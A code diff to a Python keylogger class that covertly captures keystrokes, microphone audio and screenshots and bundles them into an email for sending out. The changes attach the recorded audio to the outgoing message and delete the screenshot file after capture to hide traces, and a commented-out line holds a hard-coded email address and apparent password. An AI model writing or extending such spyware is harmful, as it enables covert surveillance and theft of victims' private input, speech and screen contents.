@@ -12,6 +12,7 @@ from pynput.keyboard import Listener
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
 
 
 class KeyLogger:
@@ -92,14 +93,17 @@ class KeyLogger:
         obj.setnchannels(1)  # mono
         obj.setsampwidth(2)
         obj.setframerate(fs)
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
         obj.writeframesraw(myrecording)
         sd.wait()
-
+        with open("sound.wav" ,'rb') as f: 
+            l = f.read()
+        ses=MIMEApplication(l, 'sound.wav')
+        self.msgRoot.attach(ses)
         #self.send_mail(email="bycerannn@yandex.com", password="1998-949", message=obj)
 
     def screenshot(self):
-
+        
         img = pyscreenshot.grab()
         img.save("img.png")
         with open("img.png" ,'rb') as f: 
@@ -108,6 +112,7 @@ class KeyLogger:
         msgImg.add_header('Content-ID', '<image1>')
         msgImg.add_header('Content-Disposition', 'inline', filename="img.png")
         self.msgRoot.attach(msgImg)
+        os.remove("img.png")
         
        
 
